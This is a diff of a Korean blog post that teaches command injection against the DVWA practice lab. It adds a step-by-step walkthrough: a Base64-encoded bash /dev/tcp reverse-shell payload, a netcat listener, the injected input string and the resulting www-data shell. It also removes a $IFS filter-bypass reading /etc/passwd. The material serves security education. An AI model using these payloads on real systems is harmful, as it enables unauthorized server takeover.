@@ -9,8 +9,6 @@ categories: [웹 해킹]
 
 명령어 인젝션은 사용자의 입력값이 서버의 쉘 명령어의 일부로 검증 없이 전달될 때 발생하는 취약점이다. 공격자는 쉘의 특수문자(Metacharacters)를 주입하여 원래의 명령어를 종료시키거나 변조하고 자신이 원하는 새로운 명령어를 실행시킬 수 있다.
 
-이 공격은 [A01: 접근 통제 실패](https://hamap0.github.io/projects/owasp-top-10/2025/08/25/A01_Broken-Access-Control.html) 보고서에서 리버스 쉘을 획득하여 서버 제어권을 장악하는 데 결정적인 역할을 했다.
-
 ---
 
 ### 2. 주요 공격 기법
@@ -31,28 +29,80 @@ categories: [웹 해킹]
 
 ### 3. 필터링 우회 기법
 
-단순한 메타 문자 주입은 방어 로직에 의해 차단될 수 있다. 이때는 필터링 규칙을 우회하는 기법이 필요하다.
-
-#### **공백 문자 필터링 우회**
-일부 시스템은 명령어 사이의 공백 문자를 필터링한다. 이때는 공백 대신 쉘의 내부 필드 구분자(Internal Field Separator)인 `$IFS` 변수를 사용할 수 있다.
-*   **기본:** `cat /etc/passwd`
-*   **우회:** `cat$IFS/etc/passwd`
-
 #### **키워드 필터링 우회 (Base64 인코딩)**
-`cat` · `ls` · `nc` 등 특정 명령어 키워드가 필터링될 때 사용된다. 실행할 명령어를 Base64로 인코딩하여 필터링을 우회한 뒤 서버에서 디코딩하여 실행시킨다.
-1.  **공격자 PC에서 페이로드 인코딩:**
-    ```bash
-    # 실행할 리버스 쉘 명령어를 Base64로 인코딩 (-w0 옵션은 줄바꿈 없이 한 줄로 출력)
-    echo "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1" | base64 -w0
-    ```
-2.  **대상 서버에서 디코딩 및 실행:**
-    인코딩된 문자열을 `echo`로 출력하고 파이프(`|`)를 통해 `base64 -d`로 디코딩한 뒤 다시 파이프를 통해 `bash`로 실행시킨다.
-    ```bash
-    # DVWA 입력값:
-    127.0.0.1; echo <Base64 Encoded String> | base64 -d | bash
-    ```
-   ![CommandinjectionBase64](/assets/images/Cinjection_1.png)
 
-이 방식은 필터링이 복잡할수록 유용하며 `A01` 보고서에서 서버 제어권을 획득할 때 사용된 핵심 기법이다.
+`cat`, `ls`, `bash` 등 특정 명령어가 서버에서 차단될 경우,  
+공격자는 명령어를 **Base64로 인코딩**해 필터를 우회할 수 있다.  
+서버 측에서 이를 디코딩 후 실행하면, 차단되지 않은 상태로 명령어가 수행된다.
+
+#### **공격 흐름 (5단계)**
+
+**1. 공격자: 리버스 셸 페이로드 인코딩**  
+로컬 머신에서 실행할 명령어를 Base64로 인코딩한다.
+
+```bash
+$ echo "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1" | base64 -w0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx
+```
+
+>  인코딩된 문자열(`YmFzaC...`)을 복사해 둔다.
+
+---
+
+**2. 공격자: 리스너 준비**  
+Netcat으로 4444 포트에서 연결을 기다린다.
+
+```bash
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+---
+
+**3. 공격: DVWA에 페이로드 삽입**  
+DVWA의 `Command Injection` 입력란에 다음을 전달한다.
+
+```text
+127.0.0.1; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx | base64 -d | bash
+```
+
+- `127.0.0.1`은 원래 ping 명령의 대상 (정상 요청처럼 위장)  
+- `;` 이후가 실제 공격 페이로드  
+- `echo ... | base64 -d | bash` → 인코딩된 명령어를 디코딩 후 실행
+
+---
+
+**4. 서버: 명령어 실행**  
+서버는 내부적으로 다음을 수행한다:
+
+```bash
+# 1. echo로 인코딩 문자열 출력
+# 2. base64 -d로 디코딩 → "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1"
+# 3. 그 결과를 bash에 파이프 → 리버스 셸 연결 시도
+```
+
+---
+
+**5. 공격 성공: 리버스 셸 획득**  
+공격자의 Netcat 터미널에 연결이 수립되고, 쉘 접근이 가능해진다.
+
+```bash
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.9.200.12] from (UNKNOWN) [192.9.200.11] 38912
+www-data@dvwa:/var/www/html$
+www-data@dvwa:/var/www/html$ whoami
+www-data
+```
+
+>  이 시점에서 공격자는 서버의 `www-data` 권한으로 명령어를 자유롭게 실행할 수 있다.
+
+---
+
+### 왜 이 방식이 효과적인가?
+
+- **필터링 회피**: `bash`, `/dev/tcp` 같은 키워드가 직접 전달되지 않음  
+- **유연성**: 어떤 명령어든 Base64로 감싸 전달 가능  
+- **실전 적용**: `A01:2021` 보고서에서도 동일 기법으로 서버 제어권 확보
 
 <hr class="short-rule">
